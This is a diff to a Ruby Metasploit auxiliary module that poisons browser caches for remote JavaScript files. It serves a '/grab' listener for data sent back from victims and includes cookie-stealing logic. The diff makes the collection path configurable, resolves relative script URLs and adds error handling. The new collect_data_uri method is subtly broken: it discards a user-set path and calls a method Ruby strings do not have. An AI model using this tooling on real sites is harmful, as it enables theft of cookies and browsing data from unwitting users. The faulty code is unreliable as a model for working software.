@@ -76,7 +76,7 @@ class Metasploit3 < Msf::Auxiliary
 		super
 		# clear my resource, deregister ref, stop/close the HTTP socket
 		begin
-			@http_service.remove_resource("/grab")
+			@http_service.remove_resource(collect_data_uri)
 			@http_service.deref
 			@http_service.stop
 			@http_service.close
@@ -140,7 +140,7 @@ class Metasploit3 < Msf::Auxiliary
 			'Proc' => Proc.new { |cli, req|
 				on_request_uri(cli, req)
 			},
-			'Path' => "/grab"
+			'Path' => collect_data_uri
 		}.update(opts['Uri'] || {})
 
 		proto = (datastore["SSL"] ? "https" : "http")
@@ -715,24 +715,43 @@ class Metasploit3 < Msf::Auxiliary
 
 	# @return [Array<Array<String>>] list of URLs for remote javascripts that are cacheable
 	def find_cached_scripts
-		cached_scripts = all_script_urls(urls).map do |urls_for_site|
+		cached_scripts = all_script_urls(urls).each_with_index.map do |urls_for_site, i|
+			begin
+				page_uri = URI.parse(urls[i])
+			rescue URI::InvalidURIError => e
+				next
+			end
+
 			results = urls_for_site.uniq.map do |url|
-				print_status "URL: #{url}"
-				io = open url
-				# parse some HTTP headers and do type coercions
-				last_modified = io.last_modified
-				expires = Time.parse(io.meta['expires']) rescue nil
-				cache_control = io.meta['cache-control'] || ''
-				charset = io.charset
-				etag = io.meta['etag']
-				# lets see if we are able to "poison" the cache for this asset...
-				if (!expires.nil? && Time.now < expires) or
-					 (cache_control.length > 0) or   # if asset is cacheable
-					 (last_modified.length > 0)
-					print_status("Found cacheable #{url}")
-					io.meta.merge(:body => io.read, :url => url)
-				else
-					nil
+				begin
+					print_status "URL: #{url}"
+					begin
+						script_uri = URI.parse(url)
+						if script_uri.relative?
+							url = page_uri + url
+						end
+						io = open(url)
+					rescue URI::InvalidURIError => e
+						next
+					end
+
+					# parse some HTTP headers and do type coercions
+					last_modified = io.last_modified
+					expires = Time.parse(io.meta['expires']) rescue nil
+					cache_control = io.meta['cache-control'] || ''
+					charset = io.charset
+					etag = io.meta['etag']
+					# lets see if we are able to "poison" the cache for this asset...
+					if (!expires.nil? && Time.now < expires) or
+						 (cache_control.length > 0) or   # if asset is cacheable
+						 (not last_modified.nil? and last_modified.to_s.length > 0)
+						print_status("Found cacheable #{url}")
+						io.meta.merge(:body => io.read, :url => url)
+					else
+						nil
+					end
+				rescue Errno::ENOENT => e # lots of things can go wrong here.
+					next
 				end
 			end
 			results.compact # remove nils
@@ -745,7 +764,9 @@ class Metasploit3 < Msf::Auxiliary
 
 	# @return [String] the path to send data back to
 	def collect_data_uri
-		"/grab"
+		path = datastore["URI_PATH"]
+		path = if not path or path.empty? then '/grab' end
+		if path.starts_with '/' then path else "/#{path}" end
 	end
 
 	# @return [String] formatted http/https URL of the listener
@@ -780,9 +801,9 @@ class Metasploit3 < Msf::Auxiliary
 	# @param [String] input the unencoded string
 	# @return [String] input with dangerous chars replaced with xml entities
 	def escape_xml(input)
-		input.gsub("&", "&amp;").gsub("<", "&lt;")
-		     .gsub(">", "&gt;").gsub("'", "&apos;")
-		     .gsub("\"", "&quot;")
+		input.to_s.gsub("&", "&amp;").gsub("<", "&lt;")
+		          .gsub(">", "&gt;").gsub("'", "&apos;")
+		          .gsub("\"", "&quot;")
 	end
 
 	def should_steal_cookies?
